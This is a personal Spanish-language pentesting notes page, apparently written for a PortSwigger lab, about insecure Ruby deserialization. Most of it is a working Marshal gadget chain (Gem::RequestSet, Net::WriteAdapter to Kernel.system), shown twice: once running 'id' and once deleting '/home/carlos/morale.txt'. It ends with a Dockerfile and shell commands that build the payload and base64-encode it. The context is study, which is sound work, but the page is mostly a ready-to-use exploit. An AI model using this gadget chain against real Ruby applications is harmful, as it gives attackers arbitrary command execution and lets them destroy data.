<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>M0B notes</title>
  <meta name="description" content="&lt;p&gt;&lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization&quot;&gt;PayloadsAllTheThings/Insecure Deserialization at master · swisskyrepo/PayloadsAllTheThings · GitHub&lt;/a&gt;&lt;/p&gt;">
  <link rel="stylesheet" href="/assets/css/style.css">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link rel="icon" href="/M0B.png" type="image/png">
  <style>
    /* fallback si la hoja no carga */
    body{background:#000;color:#e6e6e6;font:16px/1.7 ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace}
  </style>
  
  <script defer src="/assets/js/copy-code.js"></script>
</head>
<body>
  <header class="site-header">
    <div class="site-brand">
      <img class="brand-logo" src="/M0B.png" alt="logo" />
      <div class="brand-title">M0B notes</div>
    </div>
    <nav class="site-nav">
      <a href="/">Inicio</a>
      <a href="/puertos/">Puertos</a>
      <a href="/escalada/">Escalada</a>
      <a href="/portswigger/">Portswigger</a>
      <a href="/hackthebox/">HackTheBox</a>
      <a href="/real_life/">Real Life</a>
      <a href="/extras/">Extras</a>
    </nav>
  </header>

  <main>
    <div class="container">
      <p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization">PayloadsAllTheThings/Insecure Deserialization at master · swisskyrepo/PayloadsAllTheThings · GitHub</a></p>

<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Ruby.md">PayloadsAllTheThings/Insecure Deserialization/Ruby.md at master · swisskyrepo/PayloadsAllTheThings · GitHub</a></p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Autoload the required classes</span>
<span class="no">Gem</span><span class="o">::</span><span class="no">SpecFetcher</span>
<span class="no">Gem</span><span class="o">::</span><span class="no">Installer</span>

<span class="c1"># prevent the payload from running when we Marshal.dump it</span>
<span class="k">module</span> <span class="nn">Gem</span>
  <span class="k">class</span> <span class="nc">Requirement</span>
    <span class="k">def</span> <span class="nf">marshal_dump</span>
      <span class="p">[</span><span class="vi">@requirements</span><span class="p">]</span>
    <span class="k">end</span>
  <span class="k">end</span>
<span class="k">end</span>

<span class="n">wa1</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">WriteAdapter</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="no">Kernel</span><span class="p">,</span> <span class="ss">:system</span><span class="p">)</span>

<span class="n">rs</span> <span class="o">=</span> <span class="no">Gem</span><span class="o">::</span><span class="no">RequestSet</span><span class="p">.</span><span class="nf">allocate</span>
<span class="n">rs</span><span class="p">.</span><span class="nf">instance_variable_set</span><span class="p">(</span><span class="s1">'@sets'</span><span class="p">,</span> <span class="n">wa1</span><span class="p">)</span>
<span class="n">rs</span><span class="p">.</span><span class="nf">instance_variable_set</span><span class="p">(</span><span class="s1">'@git_set'</span><span class="p">,</span> <span class="s2">"id"</span><span class="p">)</span>

<span class="n">wa2</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">WriteAdapter</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="n">rs</span><span class="p">,</span> <span class="ss">:resolve</span><span class="p">)</span>

<span class="n">i</span> <span class="o">=</span> <span class="no">Gem</span><span class="o">::</span><span class="no">Package</span><span class="o">::</span><span class="no">TarReader</span><span class="o">::</span><span class="no">Entry</span><span class="p">.</span><span class="nf">allocate</span>
<span class="n">i</span><span class="p">.</span><span class="nf">instance_variable_set</span><span class="p">(</span><span class="s1">'@read'</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
<span class="n">i</span><span class="p">.</span><span class="nf">instance_variable_set</span><span class="p">(</span><span class="s1">'@header'</span><span class="p">,</span> <span class="s2">"aaa"</span><span class="p">)</span>


<span class="n">n</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">BufferedIO</span><span class="p">.</span><span class="nf">allocate</span>
<span class="n">n</span><span class="p">.</span><span class="nf">instance_variable_set</span><span class="p">(</span><span class="s1">'@io'</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
<span class="n">n</span><span class="p">.</span><span class="nf">instance_variable_set</span><span class="p">(</span><span class="s1">'@debug_output'</span><span class="p">,</span> <span class="n">wa2</span><span class="p">)</span>

<span class="n">t</span> <span class="o">=</span> <span class="no">Gem</span><span class="o">::</span><span class="no">Package</span><span class="o">::</span><span class="no">TarReader</span><span class="p">.</span><span class="nf">allocate</span>
<span class="n">t</span><span class="p">.</span><span class="nf">instance_variable_set</span><span class="p">(</span><span class="s1">'@io'</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>

<span class="n">r</span> <span class="o">=</span> <span class="no">Gem</span><span class="o">::</span><span class="no">Requirement</span><span class="p">.</span><span class="nf">allocate</span>
<span class="n">r</span><span class="p">.</span><span class="nf">instance_variable_set</span><span class="p">(</span><span class="s1">'@requirements'</span><span class="p">,</span> <span class="n">t</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="no">Marshal</span><span class="p">.</span><span class="nf">dump</span><span class="p">([</span><span class="no">Gem</span><span class="o">::</span><span class="no">SpecFetcher</span><span class="p">,</span> <span class="no">Gem</span><span class="o">::</span><span class="no">Installer</span><span class="p">,</span> <span class="n">r</span><span class="p">])</span>
<span class="nb">puts</span> <span class="n">payload</span><span class="p">.</span><span class="nf">inspect</span>
<span class="nb">puts</span> <span class="no">Marshal</span><span class="p">.</span><span class="nf">load</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</code></pre></div></div>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Autoload the required classes</span>
<span class="no">Gem</span><span class="o">::</span><span class="no">SpecFetcher</span>
<span class="no">Gem</span><span class="o">::</span><span class="no">Installer</span>

<span class="c1"># prevent the payload from running when we Marshal.dump it</span>
<span class="k">module</span> <span class="nn">Gem</span>
  <span class="k">class</span> <span class="nc">Requirement</span>
    <span class="k">def</span> <span class="nf">marshal_dump</span>
      <span class="p">[</span><span class="vi">@requirements</span><span class="p">]</span>
    <span class="k">end</span>
  <span class="k">end</span>
<span class="k">end</span>

<span class="n">wa1</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">WriteAdapter</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="no">Kernel</span><span class="p">,</span> <span class="ss">:system</span><span class="p">)</span>

<span class="n">rs</span> <span class="o">=</span> <span class="no">Gem</span><span class="o">::</span><span class="no">RequestSet</span><span class="p">.</span><span class="nf">allocate</span>
<span class="n">rs</span><span class="p">.</span><span class="nf">instance_variable_set</span><span class="p">(</span><span class="s1">'@sets'</span><span class="p">,</span> <span class="n">wa1</span><span class="p">)</span>
<span class="n">rs</span><span class="p">.</span><span class="nf">instance_variable_set</span><span class="p">(</span><span class="s1">'@git_set'</span><span class="p">,</span> <span class="s2">"rm /home/carlos/morale.txt"</span><span class="p">)</span> <span class="c1">#Comando a ejecutar</span>

<span class="n">wa2</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">WriteAdapter</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="n">rs</span><span class="p">,</span> <span class="ss">:resolve</span><span class="p">)</span>

<span class="n">i</span> <span class="o">=</span> <span class="no">Gem</span><span class="o">::</span><span class="no">Package</span><span class="o">::</span><span class="no">TarReader</span><span class="o">::</span><span class="no">Entry</span><span class="p">.</span><span class="nf">allocate</span>
<span class="n">i</span><span class="p">.</span><span class="nf">instance_variable_set</span><span class="p">(</span><span class="s1">'@read'</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
<span class="n">i</span><span class="p">.</span><span class="nf">instance_variable_set</span><span class="p">(</span><span class="s1">'@header'</span><span class="p">,</span> <span class="s2">"aaa"</span><span class="p">)</span>


<span class="n">n</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">BufferedIO</span><span class="p">.</span><span class="nf">allocate</span>
<span class="n">n</span><span class="p">.</span><span class="nf">instance_variable_set</span><span class="p">(</span><span class="s1">'@io'</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
<span class="n">n</span><span class="p">.</span><span class="nf">instance_variable_set</span><span class="p">(</span><span class="s1">'@debug_output'</span><span class="p">,</span> <span class="n">wa2</span><span class="p">)</span>

<span class="n">t</span> <span class="o">=</span> <span class="no">Gem</span><span class="o">::</span><span class="no">Package</span><span class="o">::</span><span class="no">TarReader</span><span class="p">.</span><span class="nf">allocate</span>
<span class="n">t</span><span class="p">.</span><span class="nf">instance_variable_set</span><span class="p">(</span><span class="s1">'@io'</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>

<span class="n">r</span> <span class="o">=</span> <span class="no">Gem</span><span class="o">::</span><span class="no">Requirement</span><span class="p">.</span><span class="nf">allocate</span>
<span class="n">r</span><span class="p">.</span><span class="nf">instance_variable_set</span><span class="p">(</span><span class="s1">'@requirements'</span><span class="p">,</span> <span class="n">t</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="no">Marshal</span><span class="p">.</span><span class="nf">dump</span><span class="p">([</span><span class="no">Gem</span><span class="o">::</span><span class="no">SpecFetcher</span><span class="p">,</span> <span class="no">Gem</span><span class="o">::</span><span class="no">Installer</span><span class="p">,</span> <span class="n">r</span><span class="p">])</span>
<span class="nb">puts</span> <span class="n">payload</span> <span class="c1">#Así sale en formato correcto</span>
</code></pre></div></div>

<p>Para poder ejecutar el script de arriba :</p>

<div class="language-Dockerfile highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Usa una imagen base de Ruby 2.7</span>
<span class="k">FROM</span><span class="s"> ruby:2.7</span>

<span class="c"># Establece el directorio de trabajo dentro del contenedor</span>
<span class="k">WORKDIR</span><span class="s"> /app</span>

<span class="c"># Copia tu archivo ruby (por ejemplo ruby_deser.rb) al contenedor</span>
<span class="k">COPY</span><span class="s"> ruby_deser.rb /app/ruby_deser.rb</span>

<span class="c"># Instala cualquier dependencia necesaria</span>
<span class="k">RUN </span>apt-get update <span class="o">&amp;&amp;</span> apt-get <span class="nb">install</span> <span class="nt">-y</span> <span class="se">\
</span>  build-essential <span class="se">\
</span>  libssl-dev <span class="se">\
</span>  libreadline-dev <span class="se">\
</span>  zlib1g-dev

<span class="c"># Instala las gemas que necesites, si las tienes en un Gemfile</span>
<span class="c"># Si no tienes un Gemfile, puedes instalar las gemas directamente con gem install</span>
<span class="k">RUN </span>gem <span class="nb">install base64</span>

<span class="c"># Comando por defecto para ejecutar el script</span>
<span class="k">CMD</span><span class="s"> ["ruby", "ruby_deser.rb"]</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nano ruby_deser.rb

...

docker build <span class="nt">-t</span> ruby-exploit <span class="nb">.</span>

docker run <span class="nt">--rm</span> ruby-exploit | <span class="nb">base64</span> <span class="nt">-w</span> 0 <span class="p">;</span> <span class="nb">echo</span>
</code></pre></div></div>

<p>Si cambiamos el contenido del script se repiten los pasos</p>


      <div class="footer">
        <span class="muted">© 2025 · Generado con Jekyll</span>
      </div>
    </div>
  </main>
</body>
</html>

